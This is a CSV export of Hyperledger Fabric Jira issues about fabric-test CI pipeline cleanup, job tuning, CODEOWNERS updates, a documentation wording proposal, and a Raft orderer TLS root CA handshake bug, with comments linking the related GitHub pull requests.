Remove installing node v8.11.3 as a prerequisite in scripts,FAB-17212,43617,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,rameshthoomu,suryalnvs,suryalnvs,06/Dec/19 6:58 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,21/Jan/20 6:10 AM,v1.4.5,v2.0.0,,,,,,,,v1.4.5,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,Remove installing node v8.11.3 as a prerequisite in scripts - scripts/pre-setup.sh. With which we are reinstalling node again in build process.,,rameshthoomu,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqfo:k",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Dec/19 5:12 AM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/31 |https://github.com/hyperledger/fabric-test/pull/31]master;;;","13/Dec/19 5:16 AM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/32] -release-1.4

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Streamline pulling or building only the needed tools in fabric-test jobs,FAB-17213,43618,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,scottz,scottz,06/Dec/19 7:21 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,25/Feb/20 4:15 AM,v2.0.0,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,azp-backlog,,,,,"Pull baseimage (thirdparty) docker images from dockerhub instead, while running tests, and don't use the pullDockerImages.sh script for thirdparty.

Maybe remove govendor.

R\emove the fabric-ca-client and other items no longer needed, since we have removed behave and other tests.

 ",,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqfo:l",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Feb/20 4:15 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/85;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"fabric-test azure pipeline should always CopyLogs and artifacts, whether tests fail or succeed",FAB-17214,43619,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,scottz,scottz,06/Dec/19 7:38 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,21/Jan/20 6:11 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"After RunSmokeTests runs in fabric-test Verify job, whether pass or fail, we should always execute CopyLogs and PublishBuildArtifacts and PublishTestResults. But currently they do not run if there is a test failure.

[https://dev.azure.com/Hyperledger/Fabric-Test/_build/results?buildId=3161&view=logs&j=1d99425b-0e5e-525f-8602-4964d4d27096&t=38ca6ba2-f544-5f3c-d914-a72629ae3db6]",,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqfo:m",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,scottz,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Dec/19 12:41 AM;rameshthoomu;https://github.com/hyperledger/fabric-test/pull/34;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Standardize Logging Format in PTE,FAB-17215,43620,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,06/Dec/19 8:12 AM,11/Jun/20 11:37 PM,28/Oct/23 3:09 AM,11/Jun/20 11:37 PM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,"We need to standardize on a format and implement in both PTE and Operator. We should consider the format Matt recommended in his meeting.

We should have a flag that switches between human readable for logging when running locally and JSON based for when running in Kube with LogDNA",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191h:r",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fine-tune Verify and Daily Jobs in fabric-test for efficiency and more test coverage,FAB-17216,43628,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,bharadwajambati1,scottz,scottz,06/Dec/19 11:26 PM,17/Mar/20 11:45 PM,28/Oct/23 3:09 AM,22/Jan/20 3:30 AM,v1.4.5,v2.0.0,,,,,,,,v1.4.5,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,"I linked this to the transition epic, as we move to Azure, because it is more important now to reduce the length of time required to run the jobs, since it takes longer in Azure. And we should improve the test coverage too. We may want to break this up into separate tasks...

 

Reduce time and coverage of verify job in fabric-test. Currently the smoke test executes a test using operator, in regression/smoke/ directory, and one of the tests using NL+PTE from the regression/daily/ directory. The NL+PTE test from the daily directory takes about 15 minutes. We should run a different one, that uses the NL to launch a network and uses PTE to send only a few transactions (5 to 10 per 2 threads, 1 channel). The goal of the verify job is to verify the basic functionality of NL and PTE, not to test fabric.

Also, the smoke test should use raft instead of kafka. And most of the tests in the daily suite should be converted to raft too. Suggest to convert all smoke and daily NL+PTE tests to use raft except for two to remain kafka:  test_FAB3833_2i_FAB3810_2q and test_FAB3808_2i_FAB3811_2q

Change two of the daily NL+PTE tests to use SampleJava chaincode: FAB3832_FAB3834 and FAB3807_FAB3835. Others use go or nodejs language already.

Add a samplejava testcase to the k8s systest suites, probably for raft network.

And (to provide coverage similar to 8384 or 8414), change some existing tests to require multiple endorsements; suggestion is to change one in the NL+PTE daily suite such as test_FAB3808_2i_FAB3811_2q, plus samplejs_2chan in the k8s systest suite (SBE_go_2chan in the systest suite already used 2 endorsements).

And add the SBE test to the k8s raft network-spec test suite. It is currently only run with one kafka network. That way, when we remove the kafka network next year, we won't have to move tests around. Everything in the kafka network test suite should be run in the raft network too.",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17320,FAB-17321,FAB-17322,FAB-17323,FAB-17324,FAB-17325,FAB-17326,,,,,,,,,,FAB-17378,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8y",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jan/20 3:49 AM;scottz;[https://github.com/hyperledger/fabric-test/pull/46] (master branch) addresses many of the items in the description, but not the following. These remaining items can be done with another PR. They would increase coverage in the key areas:
 * Add a samplejava testcase to the k8s systest suite for raft network, which should run all 3 samplecc in go, nodejs, java.
 * Add the SBE test to the k8s raft-couchdb-mutualtls network-spec test suite. 
 * Require 2 endorsements for more tests, instead of just 1, and send the invoke transactions to peers in multiple orgs. Only the SBE testcase does this today.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update codeowners file in fabric-test,FAB-17217,43629,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,dongming,scottz,scottz,06/Dec/19 11:33 PM,22/Jan/20 2:35 AM,28/Oct/23 3:09 AM,22/Jan/20 2:35 AM,v1.4.5,v2.0.0,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"There are currently 8 people named as maintainers in the fabric-test  CODEOWNERS file. Some are non-participants and therefore could be removed, including:

[~bmos299] [~lhaskins]  [~AdnanChoudhury] and maybe [~ChristopherFerris]

And we could add others now :

[~suryalnvs]  [~btl5037]",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8z",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jan/20 6:25 AM;scottz;[https://github.com/hyperledger/fabric-test/pull/49]

Fabric policy is to remove people that have been idle for 6 months. It has been longer than that for these folks being removed now. And it is a no-brainer to add Surya and Brett, who are very active and architected much of the operator tool code, templates, scripts and the CI related setuup files.;;;","17/Jan/20 11:33 PM;btl5037;HLF will also add Surya and myself to the Fabric-Test Maintainers Team in GitHub;;;","17/Jan/20 11:34 PM;btl5037;Surya needs to be added to the HL org on GitHub. There is no automated process for this and I will manually reach out to the HLF Community Architect team to have him invited to the org;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Regarding para 1.3 and mention of BFT consensus protocol,FAB-17218,43631,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,anupamtiwari,anupamtiwari,anupamtiwari,07/Dec/19 2:27 AM,09/Feb/21 12:34 AM,28/Oct/23 3:09 AM,09/Feb/21 12:34 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"In para 1.3,it is mentioned

"" By relying on the identities of the participants, a permissioned blockchain can use more traditional crash fault tolerant (CFT) or byzantine fault tolerant (BFT) consensus protocols that do not require costly mining.""

While ideally it should read

""By relying on the identities of the participants, a permissioned blockchain can use more traditional crash fault tolerant (CFT) that does not require costly mining instead of  byzantine fault tolerant (BFT) consensus protocols which may suit multi-party permission-less use case""",,anupamtiwari,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015yb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),anupamtiwari,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Feb/21 12:34 AM;pandrejko;The work item does not specify which topic this suggestion refers to.

I'm not able to find any reference in the current master branch that contains this content. The Networks key concept topic was recently rewritten if it was in there.

So I am cancelling this work item.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-test tools should print error response.status and reason in every thrown error,FAB-17219,43632,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,dongming,scottz,scottz,07/Dec/19 5:24 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,28/Feb/20 12:51 AM,v1.4.5,v2.0.0,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqfo:n",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,scottz,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Feb/20 6:00 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/102];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel Root TLS CA pool expansion doesn't reach TLS client handshake in Raft orderers,FAB-17220,43633,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,07/Dec/19 6:39 AM,19/Dec/19 10:17 PM,28/Oct/23 3:09 AM,19/Dec/19 10:17 PM,v1.4.4,v2.0.0,,,,,,,,v1.4.5,v2.0.0,,,fabric-orderer,,,,,,,,,0,,,,,,"When we expand the root TLS CA in the channel config, after
Raft membership has expanded with an OSN that is issed a certificate
by a new TLS CA, the TLS client handshake uses the old root CA pool
and as a result the added orderer cannot be reached by the existing ones,
because their dialers reject its certificate.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015yj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Dec/19 6:46 AM;yacovm;https://github.com/hyperledger/fabric/pull/376 ;;;","07/Dec/19 7:04 AM;yacovm;When / if this is merged to master, I can prepare a backport to 1.4.x;;;","09/Dec/19 7:30 AM;yacovm;Backport for 1.4 https://github.com/hyperledger/fabric/pull/379 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
